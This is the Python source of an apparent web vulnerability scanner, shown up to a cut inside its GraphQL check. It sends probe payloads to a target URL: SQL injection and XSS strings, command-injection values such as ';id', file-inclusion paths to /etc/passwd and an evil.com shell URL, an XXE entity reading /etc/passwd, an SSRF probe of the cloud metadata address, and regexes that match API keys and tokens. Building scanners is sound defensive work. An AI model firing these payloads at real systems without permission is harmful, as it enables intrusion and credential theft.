import requests
from bs4 import BeautifulSoup
import urllib3
import re
import socket
import ssl
import dns.resolver
from urllib.parse import urljoin, urlparse
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

class WebSecurityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.base_url = self.get_base_url(target_url)
        self.domain = urlparse(target_url).netloc
        self.visited_urls = set()
        self.vulnerabilities = []
        self.technologies = []
        self.headers = {}

    def show_banner(self):
       banner = """
    ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗    ████████╗██████╗ ██╗██╗  ██╗███████╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║    ╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
    ███████╗███████║███████║██║  ██║██║  ██║██║       ██║   ██████╔╝██║█████╔╝ █████╗  
    ╚════██║██╔══██║██╔══██║██║  ██║██║  ██║██║       ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    ███████║██║  ██║██║  ██║██████╔╝██████╔╝███████╗   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                                                        
    ███████╗███████╗ ██████╗ ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔═══██╗██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗
    █████╗  ███████╗██║   ██║██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔══╝  ╚════██║██║   ██║██║   ██║   ██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██║     ███████║╚██████╔╝╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║███████╗██║  ██║
    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    """
       console.print(f"[bold red]{banner}[/bold red]")
       console.print("[bold cyan]Advanced Web Security Scanner[/bold cyan]")
       console.print("[bold yellow]Version 2.0 | By NVRK SAI KAMESH YADAVALLI[/bold yellow]\n")
    def get_base_url(self, url):
        """Extracts base URL from the given URL."""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def request_url(self, url):
        """Sends a GET request to the given URL."""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
            response = requests.get(url, headers=headers, verify=False, timeout=10)
            self.headers = response.headers
            return response
        except requests.exceptions.RequestException as e:
            console.print(f"[bold red][ERROR][/bold red] Could not connect to {url} - {e}")
            return None

    def detect_technologies(self):
        """Detects web technologies used by the target."""
        try:
            url = f"https://api.wappalyzer.com/v2/lookup/?url={self.target_url}"
            response = requests.get(url)
            if response.status_code == 200:
                self.technologies = response.json()
        except:
            pass

    def scan_sql_injection(self, url):
        """Checks for SQL Injection vulnerabilities."""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "1' ORDER BY 1--",
            "1' UNION SELECT null, version()--"
        ]
        
        for payload in payloads:
            test_url = f"{url}?id={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response:
                error_messages = [
                    "SQL syntax", "MySQL", "ORA-", "syntax error",
                    "unclosed quotation mark", "Microsoft OLE DB"
                ]
                
                for error in error_messages:
                    if error.lower() in response.text.lower():
                        self.vulnerabilities.append(["SQL Injection", url, f"Payload: {payload}"])
                        console.print(f"[bold red][VULNERABILITY][/bold red] SQL Injection found at {url}")
                        return

    def scan_xss(self, url):
        """Checks for Cross-Site Scripting (XSS) vulnerabilities."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]
        
        for payload in payloads:
            test_url = f"{url}?q={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and payload in response.text:
                self.vulnerabilities.append(["Cross-Site Scripting (XSS)", url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] XSS found at {url}")
                return

    def scan_security_headers(self, url):
        """Checks for missing security headers."""
        response = self.request_url(url)
        if response:
            headers_to_check = {
                "Content-Security-Policy": "Helps prevent XSS and data injection attacks",
                "X-Frame-Options": "Prevents clickjacking attacks",
                "X-XSS-Protection": "Enables XSS filtering in browsers",
                "X-Content-Type-Options": "Prevents MIME type sniffing",
                "Strict-Transport-Security": "Enforces HTTPS connections",
                "Referrer-Policy": "Controls referrer information",
                "Feature-Policy": "Controls which features can be used",
                "Permissions-Policy": "Controls browser features and APIs"
            }
            
            missing_headers = []
            weak_headers = []
            
            for header, description in headers_to_check.items():
                if header not in response.headers:
                    missing_headers.append(header)
                else:
                    # Check for weak values
                    if header == "X-Frame-Options" and response.headers[header] != "DENY" and response.headers[header] != "SAMEORIGIN":
                        weak_headers.append(f"{header}: {response.headers[header]} (should be DENY or SAMEORIGIN)")
                    elif header == "X-XSS-Protection" and response.headers[header] != "1; mode=block":
                        weak_headers.append(f"{header}: {response.headers[header]} (should be 1; mode=block)")
                    elif header == "Content-Security-Policy" and "unsafe-inline" in response.headers[header]:
                        weak_headers.append(f"{header}: contains unsafe-inline")
                    elif header == "Strict-Transport-Security" and "max-age=0" in response.headers[header]:
                        weak_headers.append(f"{header}: max-age=0 disables HSTS")
            
            if missing_headers:
                self.vulnerabilities.append(["Missing Security Headers", url, f"Missing: {', '.join(missing_headers)}"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Missing Security Headers at {url}: {', '.join(missing_headers)}")
            
            if weak_headers:
                self.vulnerabilities.append(["Weak Security Headers", url, f"Weak: {', '.join(weak_headers)}"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Weak Security Headers at {url}: {', '.join(weak_headers)}")

    def scan_directory_listing(self, url):
        """Checks for exposed directories (open listing)."""
        test_urls = [
            f"{url}/.git/",
            f"{url}/.svn/",
            f"{url}/.env",
            f"{url}/backup/",
            f"{url}/admin/",
            f"{url}/wp-admin/",
            f"{url}/phpinfo.php",
            f"{url}/test/",
            f"{url}/uploads/"
        ]
        
        for test_url in test_urls:
            response = self.request_url(test_url)
            if response:
                if "Index of /" in response.text or "Directory listing for /" in response.text:
                    self.vulnerabilities.append(["Open Directory Listing", test_url, "Directory listing enabled"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Open directory listing found at {test_url}")
                elif response.status_code == 200 and "root:" in response.text:
                    self.vulnerabilities.append(["Sensitive File Exposure", test_url, "Exposed sensitive file"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Sensitive file found at {test_url}")

    def scan_http_methods(self, url):
        """Checks for insecure HTTP methods."""
        try:
            response = requests.options(url, verify=False, timeout=5)
            if response.status_code == 200 and "Allow" in response.headers:
                allowed_methods = response.headers["Allow"].split(", ")
                dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]
                found_methods = [m for m in allowed_methods if m in dangerous_methods]
                
                if found_methods:
                    self.vulnerabilities.append(["Insecure HTTP Methods", url, f"Allowed: {', '.join(found_methods)}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Insecure HTTP Methods at {url}: {', '.join(found_methods)}")
        except Exception as e:
            console.print(f"[bold red][ERROR][/bold red] HTTP Methods check failed - {e}")

    def scan_sensitive_data_exposure(self, url):
        """Checks for sensitive data exposure."""
        response = self.request_url(url)
        if response:
            patterns = {
                "API Key": r"(?i)(api[_-]?key|access[_-]?key|secret[_-]?key)[\s=:>\"]+[\w\-]{20,}",
                "Password": r"(?i)(passwd|password|pwd|pass)[\s=:>\"]+[\w\-!@#$%^&*()]{8,}",
                "Email": r"(?i)(email|e-mail|mail)[\s=:>\"]+[\w\-\.]+@[\w\-\.]+\.[a-z]{2,}",
                "Credit Card": r"\b(?:\d[ -]*?){13,16}\b",
                "SSN": r"\b\d{3}[ -]?\d{2}[ -]?\d{4}\b",
                "AWS Access Key": r"AKIA[0-9A-Z]{16}",
                "AWS Secret Key": r"(?i)aws[_-]?secret[_-]?access[_-]?key[\s=:>\"]+[\w\/+]{40}",
                "Database Connection String": r"(?i)(jdbc:|mysql:|postgresql:|mongodb:|sqlserver:)[\w\/\.\:;\-]+",
                "Private Key": r"-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----",
                "OAuth Token": r"ya29\.[\w\-]+",
                "Slack Token": r"xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}",
                "Facebook Access Token": r"EAACEdEose0cBA[0-9A-Za-z]+",
                "Twitter Access Token": r"[tT][wW][iI][tT][tT][eE][rR][\s=:>\"]+[0-9a-zA-Z\-]{35,44}",
                "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
                "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
                "Heroku API Key": r"[hH][eE][rR][oO][kK][uU][\s=:>\"]+[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
                "IP Address": r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
                "Authorization Header": r"(?i)authorization: bearer [\w\-\._~+/]+=*"
            }
            
            for label, pattern in patterns.items():
                matches = re.findall(pattern, response.text)
                if matches:
                    self.vulnerabilities.append(["Sensitive Data Exposure", url, f"{label} found: {matches[0] if len(matches) == 1 else f'{len(matches)} instances'}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {label} found at {url}")

    def scan_broken_authentication(self, url):
        """Checks for authentication vulnerabilities."""
        login_urls = [
            f"{url}/login",
            f"{url}/admin",
            f"{url}/wp-login.php",
            f"{url}/administrator",
            f"{url}/signin"
        ]
        
        for login_url in login_urls:
            response = self.request_url(login_url)
            if response and response.status_code == 200:
                # Check for default credentials
                if "admin" in login_url or "login" in login_url:
                    self.vulnerabilities.append(["Potential Weak Authentication", login_url, "Default or weak login page"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] Potential weak authentication at {login_url}")
                
                # Check for password field without HTTPS
                if "password" in response.text.lower() and not url.startswith("https://"):
                    self.vulnerabilities.append(["Password Over HTTP", login_url, "Password field detected on HTTP page"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Password field detected over HTTP at {login_url}")

    def scan_csrf(self, url):
        """Checks for CSRF vulnerabilities."""
        response = self.request_url(url)
        if response:
            soup = BeautifulSoup(response.text, "html.parser")
            forms = soup.find_all("form")
            
            for form in forms:
                csrf_token = form.find("input", {"name": "csrf_token"}) or form.find("input", {"name": "csrf"})
                if not csrf_token and form.get("action", "").lower() not in ["", "#"]:
                    self.vulnerabilities.append(["Potential CSRF Vulnerability", url, "Form without CSRF protection"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] Potential CSRF vulnerability in form at {url}")

    def scan_file_inclusion(self, url):
        """Checks for Local/Remote File Inclusion vulnerabilities."""
        payloads = [
            "/etc/passwd",
            "../../../../etc/passwd",
            "http://evil.com/shell.php",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        for payload in payloads:
            test_url = f"{url}?file={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response:
                if "root:" in response.text or "Administrator" in response.text:
                    self.vulnerabilities.append(["File Inclusion Vulnerability", test_url, f"Payload: {payload}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] File Inclusion found at {test_url}")
                    return

    def scan_command_injection(self, url):
        """Checks for Command Injection vulnerabilities."""
        payloads = [
            ";id",
            "|id",
            "&&id",
            "`id`",
            "$(id)"
        ]
        
        for payload in payloads:
            test_url = f"{url}?cmd={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and ("uid=" in response.text or "gid=" in response.text or "groups=" in response.text):
                self.vulnerabilities.append(["Command Injection", test_url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Command Injection found at {test_url}")
                return

    def scan_ssrf(self, url):
        """Checks for Server-Side Request Forgery vulnerabilities."""
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost",
            "http://127.0.0.1"
        ]
        
        for payload in payloads:
            test_url = f"{url}?url={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and ("instance-id" in response.text.lower() or "amazon" in response.text.lower()):
                self.vulnerabilities.append(["SSRF Vulnerability", test_url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] SSRF found at {test_url}")
                return

    def scan_xml_external_entity(self, url):
        """Checks for XXE vulnerabilities."""
        headers = {'Content-Type': 'application/xml'}
        payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        
        try:
            response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
            if response and "root:" in response.text:
                self.vulnerabilities.append(["XXE Vulnerability", url, "XXE payload executed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] XXE found at {url}")
        except:
            pass

    def scan_insecure_deserialization(self, url):
        """Checks for Insecure Deserialization vulnerabilities."""
        payloads = [
            '{"username":"admin","password":"password","admin":true}',
            'O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password";}'
        ]
        
        for payload in payloads:
            headers = {'Content-Type': 'application/json'}
            try:
                response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
                if response and ("admin" in response.text or "serialized" in response.text):
                    self.vulnerabilities.append(["Insecure Deserialization", url, "Possible deserialization vulnerability"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] Possible insecure deserialization at {url}")
                    return
            except:
                pass

    def scan_server_info_disclosure(self, url):
        """Checks for server information disclosure."""
        response = self.request_url(url)
        if response:
            server_info = response.headers.get("Server", "")
            if server_info:
                self.vulnerabilities.append(["Server Information Disclosure", url, f"Server: {server_info}"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Server information disclosed: {server_info}")
            
            powered_by = response.headers.get("X-Powered-By", "")
            if powered_by:
                self.vulnerabilities.append(["Technology Information Disclosure", url, f"Powered by: {powered_by}"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Technology information disclosed: {powered_by}")

    def scan_cors_misconfiguration(self, url):
        """Checks for CORS misconfigurations."""
        headers = {
            'Origin': 'https://evil.com',
            'Access-Control-Request-Method': 'GET'
        }
        
        try:
            response = requests.get(url, headers=headers, verify=False, timeout=5)
            if response:
                acao = response.headers.get("Access-Control-Allow-Origin", "")
                acac = response.headers.get("Access-Control-Allow-Credentials", "")
                
                if acao == "*" and acac == "true":
                    self.vulnerabilities.append(["CORS Misconfiguration", url, "Overly permissive CORS policy"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Insecure CORS configuration at {url}")
                elif "evil.com" in acao:
                    self.vulnerabilities.append(["CORS Misconfiguration", url, "Reflects arbitrary Origin"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Reflective CORS policy at {url}")
        except:
            pass

    def scan_jwt_issues(self, url):
        """Checks for JWT implementation issues."""
        response = self.request_url(url)
        if response:
            cookies = response.cookies
            for cookie in cookies:
                if len(cookie.value) > 100 and "." in cookie.value:  # Possible JWT
                    parts = cookie.value.split(".")
                    if len(parts) == 3:
                        # Check for "none" algorithm
                        try:
                            import base64, json
                            header = json.loads(base64.b64decode(parts[0] + "===").decode('utf-8'))
                            if header.get("alg", "").lower() == "none":
                                self.vulnerabilities.append(["JWT Implementation Issue", url, "None algorithm accepted"])
                                console.print(f"[bold red][VULNERABILITY][/bold red] JWT 'none' algorithm accepted at {url}")
                        except:
                            pass

    def scan_cache_control(self, url):
        """Checks for caching issues."""
        response = self.request_url(url)
        if response:
            cache_control = response.headers.get("Cache-Control", "")
            pragma = response.headers.get("Pragma", "")
            
            if "no-store" not in cache_control.lower() and "no-cache" not in cache_control.lower() and "no-store" not in pragma.lower():
                self.vulnerabilities.append(["Cache Control Misconfiguration", url, "Missing no-store directive"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Missing Cache-Control: no-store at {url}")

    def scan_cookie_security(self, url):
        """Checks for cookie security issues."""
        response = self.request_url(url)
        if response:
            cookies = response.cookies
            for cookie in cookies:
                issues = []
                if not cookie.secure and url.startswith("https://"):
                    issues.append("Secure flag missing")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("HttpOnly flag missing")
                if cookie.has_nonstandard_attr('SameSite') and cookie.get_nonstandard_attr('SameSite').lower() not in ['strict', 'lax']:
                    issues.append("SameSite not Strict or Lax")
                
                if issues:
                    self.vulnerabilities.append(["Cookie Security Issue", url, f"{cookie.name}: {', '.join(issues)}"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] Cookie security issues for {cookie.name}: {', '.join(issues)}")

    def scan_dns_security(self):
        """Checks for DNS security issues."""
        try:
            # Check for DNS zone transfer
            answers = dns.resolver.resolve(self.domain, 'NS')
            nameservers = [str(answer) for answer in answers]
            
            for ns in nameservers:
                try:
                    axfr = dns.query.xfr(ns, self.domain)
                    records = list(axfr)
                    if records:
                        self.vulnerabilities.append(["DNS Zone Transfer", self.domain, f"Open zone transfer on {ns}"])
                        console.print(f"[bold red][VULNERABILITY][/bold red] Open DNS zone transfer on {ns}")
                        break
                except:
                    continue
            
            # Check for common DNS misconfigurations
            try:
                answers = dns.resolver.resolve(f'_dmarc.{self.domain}', 'TXT')
                dmarc_found = True
            except:
                dmarc_found = False
                self.vulnerabilities.append(["DNS Misconfiguration", self.domain, "Missing DMARC record"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Missing DMARC record")
            
            try:
                answers = dns.resolver.resolve(f'_spf.{self.domain}', 'TXT')
                spf_found = True
            except:
                spf_found = False
                self.vulnerabilities.append(["DNS Misconfiguration", self.domain, "Missing SPF record"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Missing SPF record")
            
            if not dmarc_found and not spf_found:
                self.vulnerabilities.append(["Email Spoofing Risk", self.domain, "Missing both SPF and DMARC records"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Missing both SPF and DMARC records - email spoofing possible")
        
        except Exception as e:
            console.print(f"[bold red][ERROR][/bold red] DNS check failed - {e}")

    def scan_ssl_tls(self):
        """Checks for SSL/TLS vulnerabilities."""
        try:
            hostname = urlparse(self.target_url).netloc.split(':')[0]
            port = 443
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Check certificate expiration
                    expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_remaining = (expiry_date - datetime.now()).days
                    if days_remaining < 30:
                        self.vulnerabilities.append(["SSL Certificate Expiry", hostname, f"Expires in {days_remaining} days"])
                        console.print(f"[bold yellow][WARNING][/bold yellow] SSL certificate expires in {days_remaining} days")
                    
                    # Check for weak protocols/ciphers
                    if cipher[1] in ['DES-CBC3-SHA', 'RC4-SHA', 'RC4-MD5']:
                        self.vulnerabilities.append(["Weak SSL Cipher", hostname, f"Weak cipher: {cipher[0]}"])
                        console.print(f"[bold red][VULNERABILITY][/bold red] Weak SSL cipher: {cipher[0]}")
                    
                    # Check for TLS 1.0/1.1
                    try:
                        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                        with socket.create_connection((hostname, port)) as sock:
                            with context.wrap_socket(sock, server_hostname=hostname):
                                self.vulnerabilities.append(["Insecure TLS Protocol", hostname, "TLS 1.0 supported"])
                                console.print(f"[bold red][VULNERABILITY][/bold red] TLS 1.0 supported")
                    except:
                        pass
        
        except Exception as e:
            console.print(f"[bold red][ERROR][/bold red] SSL/TLS check failed - {e}")

    def scan_clickjacking(self, url):
        """Checks for clickjacking vulnerability."""
        response = self.request_url(url)
        if response:
            xfo = response.headers.get("X-Frame-Options", "").lower()
            csp = response.headers.get("Content-Security-Policy", "").lower()
            
            if not xfo and "frame-ancestors" not in csp:
                self.vulnerabilities.append(["Clickjacking Vulnerability", url, "Missing X-Frame-Options or CSP frame-ancestors"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Clickjacking possible at {url}")

    def scan_open_redirect(self, url):
        """Checks for open redirect vulnerabilities."""
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "http://google.com"
        ]
        
        for payload in payloads:
            test_url = f"{url}?redirect={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and any(p in response.url for p in ["evil.com", "google.com"]):
                self.vulnerabilities.append(["Open Redirect", test_url, f"Redirects to: {response.url}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Open redirect found at {test_url}")
                return

    def scan_host_header_injection(self, url):
        """Checks for Host header injection."""
        headers = {'Host': 'evil.com'}
        try:
            response = requests.get(url, headers=headers, verify=False, timeout=5)
            if response and "evil.com" in response.text:
                self.vulnerabilities.append(["Host Header Injection", url, "Reflects arbitrary Host header"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Host header injection at {url}")
        except:
            pass

    def scan_http_parameter_pollution(self, url):
        """Checks for HTTP Parameter Pollution."""
        if '?' in url:
            params = url.split('?')[1].split('&')
            if len(params) > 1:
                test_url = f"{url.split('?')[0]}?{params[0].split('=')[0]}=value1&{params[0].split('=')[0]}=value2"
                response = self.request_url(test_url)
                if response and ("value1,value2" in response.text or "value2" in response.text):
                    self.vulnerabilities.append(["HTTP Parameter Pollution", url, "Multiple parameters with same name accepted"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] HTTP Parameter Pollution possible at {url}")

    def scan_content_spoofing(self, url):
        """Checks for content spoofing vulnerabilities."""
        test_url = f"{url}?message=<h1>Hacked</h1>"
        response = self.request_url(test_url)
        if response and "<h1>Hacked</h1>" in response.text:
            self.vulnerabilities.append(["Content Spoofing", url, "User input reflected without sanitization"])
            console.print(f"[bold red][VULNERABILITY][/bold red] Content spoofing possible at {url}")

    def scan_webdav(self, url):
        """Checks for WebDAV misconfigurations."""
        try:
            response = requests.request("PROPFIND", url, verify=False, timeout=5)
            if response and response.status_code == 207:
                self.vulnerabilities.append(["WebDAV Enabled", url, "WebDAV methods allowed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] WebDAV enabled at {url}")
        except:
            pass

    def scan_robots_txt(self, url):
        """Checks robots.txt for sensitive information."""
        robots_url = f"{self.base_url}/robots.txt"
        response = self.request_url(robots_url)
        if response and response.status_code == 200:
            disallowed = [line.split(": ")[1].strip() for line in response.text.splitlines() if line.lower().startswith("disallow:")]
            if disallowed:
                self.vulnerabilities.append(["Robots.txt Disclosure", robots_url, f"Disallowed paths: {', '.join(disallowed)}"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Sensitive paths in robots.txt: {', '.join(disallowed)}")

    def scan_sitemap_xml(self, url):
        """Checks sitemap.xml for sensitive information."""
        sitemap_url = f"{self.base_url}/sitemap.xml"
        response = self.request_url(sitemap_url)
        if response and response.status_code == 200:
            urls = re.findall(r'<loc>(.*?)</loc>', response.text)
            if urls:
                sensitive_urls = [u for u in urls if any(word in u.lower() for word in ['admin', 'login', 'backup', 'config'])]
                if sensitive_urls:
                    self.vulnerabilities.append(["Sitemap.xml Disclosure", sitemap_url, f"Sensitive URLs: {', '.join(sensitive_urls[:3])}"])
                    console.print(f"[bold yellow][WARNING][/bold yellow] Sensitive URLs in sitemap.xml: {', '.join(sensitive_urls[:3])}")

    def scan_backup_files(self, url):
        """Checks for common backup files."""
        backup_extensions = [
            '.bak', '.backup', '.old', '.orig', 
            '.swp', '.save', '.tmp', '.temp',
            '.zip', '.tar', '.gz', '.sql'
        ]
        
        for ext in backup_extensions:
            test_url = f"{url}{ext}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and len(response.text) > 0:
                self.vulnerabilities.append(["Backup File Found", test_url, f"Backup file extension: {ext}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Backup file found at {test_url}")

    def scan_config_files(self, url):
        """Checks for exposed configuration files."""
        config_files = [
            '.env', 'config.php', 'configuration.ini',
            'web.config', '.htaccess', 'wp-config.php',
            'settings.py', 'config.json', 'config.yml'
        ]
        
        for config in config_files:
            test_url = f"{url}/{config}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and "DB_" in response.text:
                self.vulnerabilities.append(["Config File Found", test_url, "Exposed configuration file"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Config file found at {test_url}")

    def scan_log_files(self, url):
        """Checks for exposed log files."""
        log_files = [
            'access.log', 'error.log', 'debug.log',
            'auth.log', 'server.log', 'application.log'
        ]
        
        for log in log_files:
            test_url = f"{url}/{log}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and ("GET /" in response.text or "POST /" in response.text):
                self.vulnerabilities.append(["Log File Found", test_url, "Exposed log file"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Log file found at {test_url}")

    def scan_admin_interfaces(self, url):
        """Checks for common admin interfaces."""
        admin_paths = [
            '/admin', '/wp-admin', '/administrator',
            '/manager', '/cms', '/backoffice',
            '/controlpanel', '/adminpanel', '/login'
        ]
        
        for path in admin_paths:
            test_url = f"{url}{path}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and ("login" in response.text.lower() or "password" in response.text.lower()):
                self.vulnerabilities.append(["Admin Interface Found", test_url, "Exposed admin interface"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Admin interface found at {test_url}")

    def scan_cms_specific(self, url):
        """Checks for CMS-specific vulnerabilities."""
        # WordPress checks
        wp_url = f"{url}/wp-login.php"
        response = self.request_url(wp_url)
        if response and response.status_code == 200:
            self.vulnerabilities.append(["WordPress Detected", wp_url, "WordPress login page found"])
            console.print(f"[bold yellow][WARNING][/bold yellow] WordPress detected at {url}")
            
            # Check for XML-RPC
            xmlrpc_url = f"{url}/xmlrpc.php"
            xmlrpc_response = self.request_url(xmlrpc_url)
            if xmlrpc_response and xmlrpc_response.status_code == 200 and "XML-RPC server accepts POST requests only" in xmlrpc_response.text:
                self.vulnerabilities.append(["WordPress XML-RPC Enabled", xmlrpc_url, "XML-RPC interface enabled"])
                console.print(f"[bold yellow][WARNING][/bold yellow] WordPress XML-RPC enabled at {xmlrpc_url}")
        
        # Joomla checks
        joomla_url = f"{url}/administrator"
        joomla_response = self.request_url(joomla_url)
        if joomla_response and joomla_response.status_code == 200 and "joomla" in joomla_response.text.lower():
            self.vulnerabilities.append(["Joomla Detected", joomla_url, "Joomla admin interface found"])
            console.print(f"[bold yellow][WARNING][/bold yellow] Joomla detected at {url}")
        
        # Drupal checks
        drupal_url = f"{url}/user/login"
        drupal_response = self.request_url(drupal_url)
        if drupal_response and drupal_response.status_code == 200 and "drupal" in drupal_response.text.lower():
            self.vulnerabilities.append(["Drupal Detected", drupal_url, "Drupal login page found"])
            console.print(f"[bold yellow][WARNING][/bold yellow] Drupal detected at {url}")

    def scan_api_endpoints(self, url):
        """Checks for common API endpoints."""
        api_paths = [
            '/api', '/graphql', '/rest',
            '/v1', '/v2', '/swagger',
            '/openapi', '/soap', '/jsonrpc'
        ]
        
        for path in api_paths:
            test_url = f"{url}{path}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and ("api" in response.text.lower() or "swagger" in response.text.lower()):
                self.vulnerabilities.append(["API Endpoint Found", test_url, "Exposed API endpoint"])
                console.print(f"[bold yellow][WARNING][/bold yellow] API endpoint found at {test_url}")

    def scan_webshells(self, url):
        """Checks for common webshell paths."""
        webshells = [
            '/cmd.php', '/shell.php', '/c99.php',
            '/r57.php', '/b374k.php', '/wso.php',
            '/upload.php', '/filemanager.php'
        ]
        
        for shell in webshells:
            test_url = f"{url}{shell}"
            response = self.request_url(test_url)
            if response and response.status_code == 200 and ("<form" in response.text or "system(" in response.text):
                self.vulnerabilities.append(["Possible Webshell", test_url, "Potential webshell detected"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Possible webshell at {test_url}")

    def scan_http_request_smuggling(self, url):
        """Checks for HTTP request smuggling vulnerabilities."""
        headers = {
            'Transfer-Encoding': 'chunked',
            'Content-Length': '6'
        }
        data = "0\r\n\r\nG"
        
        try:
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)
            if response and "G" in response.text:
                self.vulnerabilities.append(["HTTP Request Smuggling", url, "Potential request smuggling vulnerability"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Potential HTTP request smuggling at {url}")
        except:
            pass

    def scan_prototype_pollution(self, url):
        """Checks for prototype pollution vulnerabilities."""
        payload = '{"__proto__":{"isAdmin":true}}'
        headers = {'Content-Type': 'application/json'}
        
        try:
            response = requests.post(url, headers=headers, data=payload, verify=False, timeout=5)
            if response and "isAdmin" in response.text:
                self.vulnerabilities.append(["Prototype Pollution", url, "Possible prototype pollution vulnerability"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Possible prototype pollution at {url}")
        except:
            pass

    def scan_graphql(self, url):
        """Checks for GraphQL vulnerabilities."""
        test_url = f"{url}/graphql"
        payload = {'query': '{__schema{types{name}}}'}
        
        try:
            response = requests.post(test_url, json=payload, verify=False, timeout=5)
            if response and response.status_code == 200 and "__schema" in response.text:
